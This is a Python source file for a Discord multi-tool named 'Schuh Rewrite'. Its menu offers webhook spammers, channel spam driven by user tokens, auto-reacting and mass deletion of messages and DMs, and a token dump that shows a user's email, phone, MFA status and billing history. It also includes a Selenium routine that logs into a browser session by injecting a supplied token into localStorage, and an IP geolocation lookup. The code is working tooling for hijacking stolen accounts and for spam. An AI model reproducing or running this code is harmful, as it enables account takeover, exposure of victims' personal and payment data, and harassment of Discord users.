import os, requests, time, re, json, ipaddress, asyncio
from datetime import datetime, timedelta
from selenium import webdriver
from os import system
GREEN = '\033[92m'
PURPLE = '\033[95m'
RED = '\033[91m'
GRAY = '\033[90m'
ENDC = '\033[0m'
def validate_input(prompt, validator, error_message):
    while True:
        user_input = input(prompt).strip()
        if validator(user_input):
            return user_input
        else:
            print(RED + error_message + ENDC)
def parse_date(iso_date):
    try:
        parsed_date = datetime.fromisoformat(iso_date)
        formatted_date = parsed_date.strftime('%d.%m.%Y %H:%M')
        return formatted_date
    except ValueError:
        return "Invalid Date"
def send_discord_webhook(url, content):
    data = {'content': content}
    response = requests.post(url, json=data)
    if response.status_code == 204:
        print(GREEN + "[#] Message sent successfully!" + ENDC, ": " + PURPLE + content + ENDC)
    else:
        print(RED + f"[!] Failed to send message - RSC: {response.status_code}" + ENDC)
        print("[#] Retrying in 5 seconds...")
        time.sleep(5)
def delete_webhook(url):
    response = requests.delete(url)
    if response.status_code == 204:
        print(GREEN + "[#] Webhook deleted successfully!" + ENDC)
        input(PURPLE + "[#] Press enter to return." + ENDC)
        return True
    else:
        print(RED + f"[!] Failed to delete webhook - RSC: {response.status_code}" + ENDC)
        input(PURPLE + "[#] Press enter to return." + ENDC)
        return False
def validate_webhook(url):
    try:
        response = requests.get(url)
        response.raise_for_status()
        return True
    except (requests.RequestException, ValueError):
        return False
def get_user_info(token):
    headers = {'Authorization': token}
    try:
        response = requests.get('https://discord.com/api/v10/users/@me', headers=headers)
        response.raise_for_status()
        user_data = response.json()
        return user_data
    except requests.exceptions.RequestException:
        print(RED + f"[!] Failed to fetch token information." + ENDC)
        return None
def get_num_user_friends(token):
    headers = {'Authorization': token}
    try:
        response = requests.get('https://discord.com/api/v10/users/@me/relationships', headers=headers)
        response.raise_for_status()
        friends_data = response.json()
        num_friends = len([friend for friend in friends_data if friend['type'] == 1])
        return num_friends
    except requests.exceptions.RequestException:
        return 0
def get_num_user_guilds(token):
    headers = {'Authorization': token}
    try:
        response = requests.get('https://discord.com/api/v10/users/@me/guilds', headers=headers)
        response.raise_for_status()
        guilds_data = response.json()
        num_guilds = len(guilds_data)
        return num_guilds
    except requests.exceptions.RequestException:
        return 0
def get_created_timestamp(id):
    timestamp = ((int(id) >> 22) + 1420070400000) / 1000
    creation_date = datetime.fromtimestamp(timestamp)
    date = creation_date - timedelta(hours=2)
    return date
def validate_token(token):
    headers = {'Authorization': token}
    try:
        response = requests.get('https://discord.com/api/v10/users/@me', headers=headers)
        return response.status_code == 200
    except requests.exceptions.RequestException:
        return False
def close_all_dms(token):
    headers = {'Authorization': token}
    try:
        response = requests.get('https://discord.com/api/v10/users/@me/channels', headers=headers)
        response.raise_for_status()
        dm_channels = response.json()
        for channel in dm_channels:
            if channel['type'] != 1:
                continue
            channel_id = channel['id']
            response = requests.delete(f'https://discord.com/api/v10/channels/{channel_id}', headers=headers)
            if response.status_code == 200:
                print(GREEN + f"[#] Closed DM {channel_id}" + ENDC)
            else:
                print(RED + f"[!] Failed to close DM {channel_id} - RSC: {response.status_code}" + ENDC)
        if not any(channel['type'] == 1 for channel in dm_channels):
            print(RED + "[!] No DMs found to close." + ENDC)
        else:
            print(PURPLE + "[#] All DMs closed successfully." + ENDC)
    except requests.exceptions.RequestException:
        print(RED + f"[!] An error occurred. If this issue persists, please report it to schuh." + ENDC)
def delete_all_messages(token, channel_id):
    headers = {'Authorization': token, 'Content-Type': 'application/json'}
    user_info = get_user_info(token)
    if not user_info:
        print(RED + "[!] Unknown error occurred." + ENDC)
        return
    user_id = user_info['id']
    url = f'https://discord.com/api/v9/channels/{channel_id}/messages'
    try:
        last_message_id = None
        while True:
            params = {'limit': 100}
            if last_message_id:
                params['before'] = last_message_id
            response = requests.get(url, headers=headers, params=params)
            if response.status_code == 200:
                messages = response.json()
                if not messages:
                    break
                for message in messages:
                    last_message_id = message['id']
                    if 'call' in message:
                        continue
                    if message['author']['id'] == user_id or message['author']['bot']:
                        delete_url = f'https://discord.com/api/v9/channels/{channel_id}/messages/{message["id"]}'
                        delete_response = requests.delete(delete_url, headers=headers)
                        if delete_response.status_code == 204:
                            print(GREEN + f"[#] Successfully deleted message" + ENDC, ": " + PURPLE + message['id'] + ENDC)
                        elif delete_response.status_code == 429:
                            print("[#] Retrying in 5 seconds...")
                            time.sleep(5)
                            continue
                        else:
                            print(RED + f"[!] Failed to delete message" + ENDC, ": " + PURPLE + message['id'] + RED + f" - RSC: {delete_response.status_code}" + ENDC)
            else:
                print(RED + f"[!] Failed to retrieve messages - RSC: {response.status_code}" + ENDC)
                break
    except Exception:
        print(RED + f"[!] Unknown error occurred." + ENDC)
def react_to_message(message_id, emoji):
    reaction_url = f"https://discord.com/api/v9/channels/{channel_id}/messages/{message_id}/reactions/{emoji}/@me"
    headers = {'authorization': user_token, 'user-agent': 'Mozilla/5.0',}
    response = requests.put(reaction_url, headers=headers)
    return response.status_code, response.content.decode('utf-8')
def ip_lookup(ip):
    try:
        response = requests.get(f'https://ipinfo.io/{ip}/json')
        response.raise_for_status()
        data = response.json()
        return data
    except requests.exceptions.RequestException:
        return None
    except ValueError:
        return None
def validate_ip(ip):
    try:
        ipaddress.ip_address(ip)
        return True
    except Exception:
        return False
def get_guild_emojis(token, server_id):
    headers = {"Authorization": token}
    response = requests.get(f"https://discord.com/api/v9/guilds/{server_id}/emojis", headers=headers)
    if response.status_code == 200:
        return response.json()
    else:
        return None
async def download_emoji(emoji, inner_emoji_dir):
    emoji_path = os.path.join(inner_emoji_dir, f"{emoji['name']}.{'gif' if emoji['animated'] else 'png'}")
    try:
        response = requests.get(f"https://cdn.discordapp.com/emojis/{emoji['id']}.{'gif' if emoji['animated'] else 'png'}")
        if response.status_code == 200:
            print(GREEN + f"[#] Successfully downloaded Emoji: {emoji['name']}" + ENDC)
            with open(emoji_path, 'wb') as f:
                f.write(response.content)
            return True
        else:
            print(RED + f"[!] Failed to download Emoji: {emoji['name']} - RSC: {response.status_code}" + ENDC)
            return False 
    except Exception:
        print(RED + f"[!] Unknown error while downloading Emoji: {emoji['name']} - RSC: {response.status_code}" + ENDC)
        return False
async def download_emoji_async(emojis, inner_emoji_dir):
    print(PURPLE + f"[#] Downloading {len(emojis)} Emojis.." + ENDC)
    tasks = [download_emoji(emoji, inner_emoji_dir) for emoji in emojis]
    results = await asyncio.gather(*tasks)
    successful_downloads = sum(results)
    return successful_downloads
def get_guild_stickers(token, server_id):
    headers = {"Authorization": token}
    response = requests.get(f"https://discord.com/api/v9/guilds/{server_id}/stickers", headers=headers)
    if response.status_code == 200:
        return response.json()
    else:
        return None
def get_format_type(format_type):
    if format_type == 1:
        return 'webp'
    elif format_type == 2:
        return 'png'
    elif format_type == 3:
        return 'lottie'
    elif format_type == 4:
        return 'gif'
    else:
        return None
async def download_sticker(sticker, inner_sticker_dir):
    valid_filename = re.sub(r'[\\/*?:"<>|]', '', sticker['name'])
    sticker_path = os.path.join(inner_sticker_dir, f"{valid_filename}.webp")
    try:
        response = requests.get(f"https://media.discordapp.net/stickers/{sticker['id']}.{get_format_type(sticker['format_type'])}?size=160")
        if response.status_code == 200:
            with open(sticker_path, 'wb') as f:
                f.write(response.content)
            print(GREEN + f"[#] Successfully downloaded Sticker: {sticker['name']}" + ENDC)
            return True
        else:
            print(RED + f"[!] Failed to download Sticker: {sticker['name']} - RSC: {response.status_code}" + ENDC)
            return False
    except Exception:
        print(RED + f"[!] Error downloading Sticker {sticker['name']} - RSC: {response.status_code}" + ENDC)
        return False
async def download_stickers_async(stickers, inner_sticker_dir):
    print(PURPLE + f"[#] Downloading {len(stickers)} Stickers.." + ENDC)
    tasks = [download_sticker(sticker, inner_sticker_dir) for sticker in stickers]
    results = await asyncio.gather(*tasks)
    successful_downloads = sum(results)
    return successful_downloads
system("title " + f"Schuh Rewrite    -    CTRL + C at any time to stop")
while True:
    try:
        os.system('cls' if os.name == 'nt' else 'clear')
        mode = input(PURPLE + "[1] Webhook Spammer\n[2] Webhook Animator\n[3] Webhook Information\n[4] Webhook Deleter\n[5] Channel Spammer\n[6] Channel Monitoring\n[7] Message Deleter\n[8] DM Channel Clearer\n[9] Message Reacter\n[10] Animated Status\n[11] Hypesquad Changer\n[12] IP Address Lookup\n[13] Token Information\n[14] Token Payments\n[15] Token Login\n[16] Scrape Emojis\n[17] Scrape Stickers\n\n> " + ENDC)
        try:
            if int(mode) < 0 or int(mode) > 17:
                continue
        except ValueError:
            pass
        if mode == '1': 
            os.system('cls' if os.name == 'nt' else 'clear')
            message_content = validate_input(PURPLE + "[#] Message you want to spam: " + ENDC, lambda content: len(content) >= 1, "[#] Message too short. Please enter a message with at least 1 character.")            
            webhook_url = validate_input(PURPLE + "[#] Webhook URL: " + ENDC, validate_webhook, "[#] Invalid webhook URL. Please check the URL and try again.")
            delay = validate_input(PURPLE + "[#] Delay (in seconds): " + ENDC, lambda value: (value.replace('.', '', 1).isdigit() if '.' in value else value.isdigit()) and float(value) > 0, "[#] Invalid delay. Please enter a positive number.")
            delay = float(delay)
            while True:
                send_discord_webhook(webhook_url, message_content)
                time.sleep(delay)
        elif mode == '2':
            os.system('cls' if os.name == 'nt' else 'clear')
            message_content = validate_input(PURPLE + "[#] Message you want to spam and animate: " + ENDC, lambda content: len(content) >= 2, "[#] Message too short. Please enter a message with at least 2 characters.")            
            webhook_url = validate_input(PURPLE + "[#] Webhook URL: " + ENDC, validate_webhook, "[#] Invalid webhook URL. Please check the URL and try again.")
            delay = validate_input(PURPLE + "[#] Delay (in seconds): " + ENDC, lambda value: (value.replace('.', '', 1).isdigit() if '.' in value else value.isdigit()) and float(value) > 0, "[#] Invalid delay. Please enter a positive number.")
            delay = float(delay)
            while True:
                for i in range(1, len(message_content) + 1):
                    if message_content[i-1] != ' ':
                        animated_message = message_content[:i]
                        send_discord_webhook(webhook_url, animated_message)
                        time.sleep(delay)
                for i in range(len(message_content) - 1, 0, -1):
                    if message_content[i-1] != ' ':
                        animated_message = message_content[:i]
                        send_discord_webhook(webhook_url, animated_message)
                        time.sleep(delay)
        elif mode == '3':
            os.system('cls' if os.name == 'nt' else 'clear')
            webhook_url = validate_input(PURPLE + "[#] Webhook URL: " + ENDC, validate_webhook, "[#] Invalid webhook URL. Please check the URL and try again.")
            try:
                response = requests.get(webhook_url)
                if response.status_code == 200:
                    webhook_info = response.json()
                    print(GRAY + f"[#] Name: {webhook_info.get('name', 'N/A')}" + ENDC)
                    print(GRAY + f"[#] Guild ID: {webhook_info.get('guild_id', 'N/A')}" + ENDC)
                    print(GRAY + f"[#] Channel ID: {webhook_info.get('channel_id', 'N/A')}" + ENDC)
                    if 'avatar' in webhook_info and webhook_info['avatar'] is not None:
                        avatar_url = f"https://cdn.discordapp.com/avatars/{webhook_info['id']}/{webhook_info['avatar']}.png"
                        print(GRAY + f"[#] Avatar: {avatar_url}" + ENDC)
                    else:
                        print(GRAY + "[#] Avatar: N/A" + ENDC)
                else:
                    print(RED + f"[!] Failed to fetch webhook information - RSC: {response.status_code}" + ENDC)
                input(PURPLE + "[#] Press enter to return." + ENDC)
            except json.JSONDecodeError:
                pass
        elif mode == '4':
            os.system('cls' if os.name == 'nt' else 'clear')
            webhook_url = validate_input(PURPLE + "[#] Webhook URL: " + ENDC, validate_webhook, "[#] Invalid webhook URL. Please check the URL and try again.")
            confirmation = validate_input(PURPLE + "[#] Are you sure you want to delete the webhook? (y/n): " + ENDC, lambda v: v in ["y", "n"], "[#] Invalid Input. Please enter either 'y' or 'n'")
            if confirmation.lower() == 'y':
                delete_webhook(webhook_url)
            else:
                print(RED + "[#] Webhook deletion cancelled." + ENDC)
                input(PURPLE + "[#] Press enter to return." + ENDC)
        elif mode == '5':
            os.system('cls' if os.name == 'nt' else 'clear')
            message_content = validate_input(PURPLE + "[#] Message you want to spam: " + ENDC, lambda content: len(content) >= 1, "[#] Message too short. Please enter a message with at least 1 character.")            
            user_token = validate_input(PURPLE + "[#] Token: " + ENDC, validate_token, "[#] Invalid Token. Please check the token and try again.")
            channel_link = validate_input(PURPLE + "[#] Channel Link: " + ENDC, lambda link: re.search(r'/channels/(\d+)/', link), "[#] Invalid Channel Link. Please check the link and try again.")            
            channel_id_match = re.search(r'/channels/(\d+)/', channel_link)
            channel_id = channel_id_match.group(1) if channel_id_match else None
            num_messages = validate_input(PURPLE + "[#] Number of times to send the message: " + ENDC, lambda value: value.isdigit() and int(value) > 0, "[#] Invalid input. Please enter a positive integer.")
            num_messages = int(num_messages)
            delay = validate_input(PURPLE + "[#] Delay (in seconds): " + ENDC, lambda value: (value.replace('.', '', 1).isdigit() if '.' in value else value.isdigit()) and float(value) > 0, "[#] Invalid delay. Please enter a positive number.")
            delay = float(delay)
            payload = {'content': message_content}
            header = {'authorization': user_token}
            for i in range(num_messages):
                response = requests.post(f"https://discord.com/api/v9/channels/{channel_id}/messages", data=payload, headers=header)
                if response.status_code == 200:
                    print(GREEN + f"[#] Message {i+1}/{num_messages} sent successfully!" + ENDC, ": " + PURPLE + message_content + ENDC)
                else:
                    print(RED + f"[!] Failed to send message - RSC: {response.status_code}" + ENDC)
                    print("[#] Retrying in 5 seconds...")
                    time.sleep(5)
                time.sleep(delay)
            input(PURPLE + "[#] Done sending. Press enter to return.")
            continue
        elif mode == '6':
            os.system('cls' if os.name == 'nt' else 'clear')
            user_token = validate_input(PURPLE + "[#] Token: " + ENDC, validate_token, "[#] Invalid Token. Please check the token and try again.")
            channel_link = validate_input(PURPLE + "[#] Channel Link: " + ENDC, lambda link: re.search(r'/channels/(\d+)/', link), "[#] Invalid Channel Link. Please check the link and try again.")
            channel_id_match = re.search(r'/channels/(\d+)/', channel_link)
            channel_id = channel_id_match.group(1) if channel_id_match else None
            headers = {'authorization': user_token, 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'}
            params = {'limit': 1}
            print(GREEN + "[#] Monitoring Channel. Press Ctrl + C to stop." + ENDC)
            processed_messages = set()
            try:
                while True:
                    response = requests.get(f"https://discord.com/api/v9/channels/{channel_id}/messages", params=params, headers=headers)
                    if response.status_code != 200:
                        print(RED + f"[!] Failed to retrieve messages - RSC: {response.status_code}" + ENDC)
                    else:
                        messages = response.json()
                        for message in reversed(messages):
                            if 'content' in message and 'id' in message:
                                message_id = message['id']
                                if message_id not in processed_messages:
                                    author = message['author']['username']
                                    content = message['content']
                                    if 'bot' in message['author'] and message['author']['bot']:
                                        author = author + " [BOT]"
                                    if 'attachments' in message:
                                        for attachment in message['attachments']:
                                            filename = attachment['filename']
                                            if filename.endswith(('.jpg', '.jpeg', '.png')):
                                                if content: content += " "
                                                content = GRAY + content + ENDC + RED + "[Image]" + ENDC
                                            elif filename.endswith(('.gif')):
                                                if content: content += " "
                                                content = GRAY + content + ENDC + RED + "[GIF]" + ENDC                                                
                                            elif filename.endswith(('.mp4', '.webm', '.mov')):
                                                if content: content += " "
                                                content = GRAY + content + ENDC + RED + "[Video]" + ENDC
                                            elif filename.endswith(('.mp3', '.wav', '.ogg')):
                                                if content: content += " "
                                                content = GRAY + content + ENDC + RED + "[Audio]" + ENDC
                                    if 'sticker_items' in message:
                                        content = RED + f"[Sticker]" + ENDC
                                    print(GRAY + f"[#] {author}: {content}" + ENDC)
                                    processed_messages.add(message_id)
            except KeyboardInterrupt:
                pass
        elif mode == '7':
            os.system('cls' if os.name == 'nt' else 'clear')
            user_token = validate_input(PURPLE + "[#] Token: " + ENDC, validate_token, "[#] Invalid Token. Please check the token and try again.")
            channel_link = validate_input(PURPLE + "[#] Channel Link: " + ENDC, lambda link: re.search(r'/channels/(\d+)/', link), "[#] Invalid Channel Link. Please check the link and try again.")
            confirmation = validate_input(PURPLE + "[#] Are you sure you want to delete all messages from the provided token in this channel? (y/n): " + ENDC, lambda v: v in ["y", "n"], "[#] Invalid Input. Please enter either 'y' or 'n'")
            if confirmation == 'y':
                try:
                    match = re.search(r"/channels/(\d+)", channel_link)
                    if match:
                        channel_id = match.group(1)
                    else:
                        print(RED + "[!] Couldn't extract Channel ID" + ENDC)
                    delete_all_messages(user_token, channel_id)
                    print(PURPLE + "[#] All messages deleted successfully." + ENDC)
                except Exception:
                    print(RED + "[!] Unknown error occurred." + ENDC)
            else:
                print(RED + "[#] Message deletion cancelled." + ENDC)
            input(PURPLE + "[#] Press enter to return." + ENDC)
            continue
        elif mode == '8':
            os.system('cls' if os.name == 'nt' else 'clear')
            user_token = validate_input(PURPLE + "[#] Token: " + ENDC, validate_token, "[#] Invalid Token. Please check the token and try again.")
            confirmation = input(RED + "[#] Are you sure you want to close all DMs for the provided token?\n[#] This will not leave group chats.\n[#] (y/n): " + ENDC)
            if confirmation.lower() == "y":
                close_all_dms(user_token)
            else:
                print(RED + "[#] DM closure canceled. No DMs were closed." + ENDC)
            input(PURPLE + "[#] Press enter to return." + ENDC)
            continue
        elif mode == '9':
            os.system('cls' if os.name == 'nt' else 'clear')
            user_token = validate_input(PURPLE + "[#] Token: " + ENDC, validate_token, "[#] Invalid Token. Please check the token and try again.")
            channel_link = validate_input(PURPLE + "[#] Channel Link: " + ENDC, lambda link: re.search(r'/channels/(\d+)/', link), "[#] Invalid Channel Link. Please check the link and try again.")
            channel_id_match = re.search(r'/channels/(\d+)/', channel_link)
            channel_id = channel_id_match.group(1) if channel_id_match else None
            emoji = validate_input(PURPLE + "[#] Emoji string (without angle brackets): " + ENDC, lambda e: len(e) > 0, "[#] Emoji string cannot be empty.")
            last_message_id = None
            while True:
                response = requests.get(f"https://discord.com/api/v9/channels/{channel_id}/messages?limit=1", headers={'authorization': user_token})
                if response.status_code != 200:
                    print(RED + f"[!] Failed to retrieve messages - RSC: {response.status_code}" + ENDC)
                    input(PURPLE + "[#] Press enter to return." + ENDC)
                    continue
                messages = response.json()
                for message in messages:
                    if 'content' in message:
                        message_id = message['id']
                        if last_message_id is None or message_id > last_message_id:
                            status_code, response_content = react_to_message(message_id, emoji)
                            if status_code == 204:
                                print(GREEN + f"[#] Reacted to message" + ENDC, ": " + PURPLE + message_id + ENDC)
                            else:
                                print(RED + f"[!] Failed to react to message {message_id} - RSC: {status_code}" + ENDC)
                            last_message_id = message_id
        elif mode == '10':
            os.system('cls' if os.name == 'nt' else 'clear')
            user_token = validate_input(PURPLE + "[#] Token: " + ENDC, validate_token, "[#] Invalid Token. Please check the token and try again.")
            status_type_choice = ''
            status_type_choice = validate_input(PURPLE + "[#] 1. Plain Text Statuses\n[#] 2. Emoji & Text Statuses\n[#] Choice: " + ENDC, lambda choice: choice in ['1', '2'], "[#] Invalid Choice, please enter either 1 or 2.")
            if status_type_choice == '1':
                status_list_input = validate_input(PURPLE + "[#] Statuses (separated by commas): " + ENDC, lambda value: len(value.split(',')) >= 2 and all(s.strip() != '' for s in value.split(',')) and len(set(s.strip() for s in value.split(','))) == len(value.split(',')), "[#] Invalid Statuses. Please enter at least 2 unique statuses separated by commas.")
                status_list = [status.strip() for status in status_list_input.split(',') if status.strip()]
            elif status_type_choice == '2':
                emoji_status_pairs_input = validate_input(PURPLE + "[#] Statuses (e.g., <:en:eid> - Status1, <:en2:eid2> - Status2): " + ENDC, lambda value: all(len(pair.split('-')) == 2 and pair.split('-')[0].strip().startswith('<:') and len(set(pair.split('-')[1].strip() for pair in value.split(','))) == len(value.split(',')) for pair in value.split(',')), "[#] Invalid Emoji & Text pairs. Please enter at least 2 unique pairs in the correct format.")
                emoji_status_pairs = [pair.strip() for pair in emoji_status_pairs_input.split(',') if pair.strip()]
                status_list = []
                for pair in emoji_status_pairs:
                    emoji_text_pair = pair.split('-')
                    emoji = emoji_text_pair[0].strip()
                    text = emoji_text_pair[1].strip()
                    emoji_id = emoji.split(':')[2][:-1]
                    status_list.append({"emoji": emoji, "text": text, "emoji_id": emoji_id})
            delay =  validate_input(PURPLE + "[#] Delay (in seconds): " + ENDC, lambda value: (value.replace('.', '', 1).isdigit() if '.' in value else value.isdigit()) and float(value) > 0, "[#] Invalid delay. Please enter a positive number.")
            delay = float(delay)
            headers = {'authorization': user_token, 'user-agent': 'Mozilla/5.0', 'content-type': 'application/json'}
            index = 0
            while True:
                if status_type_choice == '1':
                    status = status_list[index]
                    payload = {'custom_status': {'text': status}}
                    status_message = status
                elif status_type_choice == '2':
                    emoji_text_pair = status_list[index]
                    payload = {'custom_status': {'text': emoji_text_pair['text'], 'emoji_name': emoji_text_pair['emoji'].split(':')[1], 'emoji_id': emoji_text_pair['emoji_id']}}
                    status_message = f"[{emoji_text_pair['emoji_id']}] {emoji_text_pair['text']}"
                payload_json = json.dumps(payload)
                response = requests.patch('https://discord.com/api/v9/users/@me/settings', data=payload_json, headers=headers)
                if response.status_code == 200:
                    print(GREEN + "[#] Changed Status to: " + PURPLE + status_message + ENDC)
                else:
                    print(RED + f"[!] Failed to change Status - RSC: {response.status_code}" + ENDC)
                index = (index + 1) % len(status_list)
                time.sleep(delay)
        elif mode == '11':
            os.system('cls' if os.name == 'nt' else 'clear')
            user_token = validate_input(PURPLE + "[#] Token: " + ENDC, validate_token, "[#] Invalid Token. Please check the token and try again.")
            hypesquad_options = {'1': 'Bravery', '2': 'Brilliance', '3': 'Balance', '4': 'Remove'}
            for option, house in hypesquad_options.items():
                print(PURPLE + f"[#] {option}. {house}" + ENDC)
            print() 
            selected_option = validate_input(PURPLE + "> " + ENDC, lambda value: value in hypesquad_options, "[#] Invalid Option. Please choose a valid Option.")
            if selected_option == '4':
                headers = {'authorization': user_token, 'content-type': 'application/json'}
                response = requests.delete('https://discord.com/api/v9/hypesquad/online', headers=headers)
                if response.status_code == 204:
                    print(GREEN + "[#] Successfully removed HypeSquad House." + ENDC)
                else:
                    print(RED + f"[!] Failed to remove HypeSquad House - RSC: {response.status_code}" + ENDC)
            else:
                hypesquad_house = hypesquad_options[selected_option]
                headers = {'authorization': user_token, 'content-type': 'application/json'}
                payload = {'house_id': selected_option}
                response = requests.post('https://discord.com/api/v9/hypesquad/online', json=payload, headers=headers)
                if response.status_code == 204:
                    print(GREEN + f"[#] Successfully changed HypeSquad House to {hypesquad_house}." + ENDC)
                else:
                    print(RED + f"[!] Failed to change HypeSquad House - RSC: {response.status_code}" + ENDC)
            input(PURPLE + "[#] Press enter to return." + ENDC)
        elif mode == '12':
            os.system('cls' if os.name == 'nt' else 'clear')
            ip_address = validate_input(PURPLE + "[#] IP Address: " + ENDC, validate_ip, "[#] Invalid IP Address. Please check the IP and try again.")
            ip_data = ip_lookup(ip_address)
            if ip_data is not None:
                print(GRAY + f"[#] City: {ip_data.get("city", "N/A")}" + ENDC)
                print(GRAY + f"[#] Region: {ip_data.get("region", "N/A")}" + ENDC)
                print(GRAY + f"[#] Country: {ip_data.get("country", "N/A")}" + ENDC)
                print(GRAY + f"[#] Postal: {ip_data.get("postal", "N/A")}" + ENDC)
                print(GRAY + f"[#] Timezone: {ip_data.get("timezone", "N/A")}" + ENDC)
                print(GRAY + f"[#] Hostname: {ip_data.get("hostname", "N/A")}" + ENDC)
                print(GRAY + f"[#] Organization: {ip_data.get("org", "N/A")}" + ENDC)
                print(GRAY + f"[#] Location: {ip_data.get("loc", "N/A")}" + ENDC)
            else:
                print(RED + "[!] Unknown error occurred." + ENDC)
            input(PURPLE + "[#] Press enter to return." + ENDC)
            continue
        elif mode == '13':
            os.system('cls' if os.name == 'nt' else 'clear')
            user_token = validate_input(PURPLE + "[#] Token: " + ENDC, validate_token, "[#] Invalid Token. Please check the token and try again.")
            num_guilds = get_num_user_guilds(user_token)
            num_friends = get_num_user_friends(user_token)
            user_info = get_user_info(user_token)
            if user_info:
                print(GRAY + f"[#] Username: {user_info['username']}" + ENDC)
                print(GRAY + f"[#] ID: {user_info['id']}" + ENDC)
                print(GRAY + f"[#] Email: {user_info['email']}" + ENDC)
                if 'verified' in user_info:
                    verified = user_info['verified']
                    if verified:
                        print(GRAY + f"[#] Email Verified: Yes" + ENDC)
                    else:
                        print(GRAY + f"[#] Email Verified: No" + ENDC)
                print(GRAY + f"[#] Phone: {user_info.get('phone', 'N/A')}" + ENDC)
                if 'mfa_enabled' in user_info:
                    mfa_enabled = user_info['mfa_enabled']
                    if mfa_enabled:
                        print(GRAY + f"[#] MFA Enabled: Yes" + ENDC)
                    else:
                        print(GRAY + f"[#] MFA Enabled: No" + ENDC)
                if 'premium_type' in user_info:
                    nitro_type = user_info['premium_type']
                    if nitro_type == 3:
                        print(GRAY + f"[#] Nitro: Yes" + ENDC)
                        print(GRAY + f"[#] Nitro Type: $3 Nitro" + ENDC)
                    elif nitro_type == 2:
                        print(GRAY + f"[#] Nitro: Yes" + ENDC)
                        print(GRAY + f"[#] Nitro Type: $10 Nitro" + ENDC)
                    elif nitro_type == 1:
                        print(GRAY + f"[#] Nitro: Yes" + ENDC)
                        print(GRAY + f"[#] Nitro Type: $5 Nitro" + ENDC)
                    else:
                        print(GRAY + f"[#] Nitro: No" + ENDC)
                print(GRAY + f"[#] Created: {parse_date(str(get_created_timestamp(user_info['id'])))}" + ENDC)
                print(GRAY + f"[#] Locale: {user_info['locale']}" + ENDC)
                print(GRAY + f"[#] Clan: {user_info['clan']}" + ENDC)
                print(GRAY + f"[#] Friends: {num_friends}" + ENDC)
                print(GRAY + f"[#] Servers: {num_guilds}" + ENDC)
            input(PURPLE + "[#] Press enter to return." + ENDC)
            continue
        elif mode == '14':
            os.system('cls' if os.name == 'nt' else 'clear')
            user_token = validate_input(PURPLE + "[#] Token: " + ENDC, validate_token, "[#] Invalid Token. Please check the token and try again.")
            headers = {'Authorization': user_token, 'Content-Type': 'application/json'}
            response = requests.get('https://discord.com/api/v9/users/@me/billing/payments', headers=headers)
            if response.status_code == 200:
                payment_history = response.json()
                if payment_history:
                    total_payment_count = sum(1 for payment in payment_history)
                    successful_payments_count = sum(1 for payment in payment_history if payment['status'] == 1)
                    failed_payments_count = sum(1 for payment in payment_history if payment['status'] == 2)
                    print(GRAY + f"[#] Total: {total_payment_count} | Successful: {successful_payments_count} | Failed: {failed_payments_count}" + ENDC)
                    for payment in payment_history:
                        item = payment.get('description', 'Unknown')
                        date = parse_date(payment['created_at'])
                        amount = payment.get('amount', {})
                        source = payment.get('payment_source', {})
                        country = source.get('country', 'N/A')
                        currency = payment.get('currency', '').upper() 
                        status = GREEN + "Success" + GRAY if payment['status'] == 1 else RED + "Failed" + GRAY
                        if isinstance(amount, dict):
                            amount_value = amount.get('amount', 0) / 100
                            amount_display = f"{currency} {amount_value:.2f}"
                        else:
                            amount_display = f"{currency} {amount / 100:.2f}"
                        print(GRAY + f"[#] Item: {item} | Amount: {amount_display} | Status: {status} | Country: {country} | Date: {date}" + ENDC)
                else:
                    print(RED + "[#] No payment history found." + ENDC)
            else:
                print(RED + f"[!] Failed to retrieve payment history - RSC: {response.status_code}" + ENDC)
            input(PURPLE + "[#] Press enter to return." + ENDC)
            continue
        elif mode == '15':
            os.system('cls' if os.name == 'nt' else 'clear')
            user_token = input(PURPLE + "[#] Token: " + ENDC)
            headers = {'Authorization': user_token}
            print(PURPLE + "[#] Logging in with Token.." + ENDC)
            options = webdriver.ChromeOptions()
            options.add_experimental_option("detach", True)
            options.add_experimental_option("excludeSwitches", ['enable-logging'])
            options.add_argument("--log-level=3")
            options.add_argument("start-maximized")
            driver = webdriver.Chrome(options=options)
            driver.get("https://discord.com/login")
            driver.execute_script('''function login(token) { setInterval(() => { document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"` }, 50); setTimeout(() => { location.reload(); }, 2500); }''' + f'\nlogin("{user_token}")')
            print(GREEN + "[#] Successfully logged in!" + ENDC)
            input(PURPLE + "[#] Press enter to return." + ENDC)
            continue
        elif mode == '16':
            os.system('cls' if os.name == 'nt' else 'clear')
            user_token = validate_input(PURPLE + "[#] Token: " + ENDC, validate_token, "[#] Invalid Token. Please check the token and try again.")
            server_id = validate_input(PURPLE + "[#] Server ID: " + ENDC, lambda id: id.isdigit() and 18 <= len(id) <= 21, "[#] Invalid Server ID. Please check the ID and try again.")
            inner_emoji_dir = os.path.join("emojis", str(server_id))
            os.makedirs(inner_emoji_dir, exist_ok=True)
            emojis = get_guild_emojis(user_token, server_id)
            if emojis:
                scs = asyncio.run(download_emoji_async(emojis, inner_emoji_dir))
                if scs:
                    print(PURPLE + f"[#] Successfully downloaded {scs} of {len(emojis)} Emojis.")
                    input(PURPLE + "[#] Press enter to return." + ENDC) 
                else:
                    print(RED + "[!] Unknown error while downloading Emojis." + ENDC)
                    input(PURPLE + "[#] Press enter to return." + ENDC)
            else:
                print(RED + "[!] Failed to retrieve Emojis from Server." + ENDC)
                input(PURPLE + "[#] Press enter to return." + ENDC)
            continue
        elif mode == '17':
            os.system('cls' if os.name == 'nt' else 'clear')
            user_token = validate_input(PURPLE + "[#] Token: " + ENDC, validate_token, "[#] Invalid Token. Please check the token and try again.")
            server_id = validate_input(PURPLE + "[#] Server ID: " + ENDC, lambda id: id.isdigit() and 18 <= len(id) <= 21, "[#] Invalid Server ID. Please check the ID and try again.")
            inner_sticker_dir = os.path.join("stickers", str(server_id))
            os.makedirs(inner_sticker_dir, exist_ok=True)
            stickers = get_guild_stickers(user_token, server_id)
            if stickers: 
                scs = asyncio.run(download_stickers_async(stickers, inner_sticker_dir))
                if scs:
                    print(PURPLE + f"[#] Successfully downloaded {scs} of {len(stickers)} Stickers.")
                    input(PURPLE + "[#] Press enter to return." + ENDC) 
                else:
                    print(RED + "[!] Unknown error while downloading Stickers." + ENDC)
                    input(PURPLE + "[#] Press enter to return." + ENDC)
            else:
                print(RED + "[!] Failed to retrieve Stickers from Server.")
                input(PURPLE + "[#] Press enter to return." + ENDC)
            continue
    except KeyboardInterrupt:
        continue
    except EOFError:
        pass
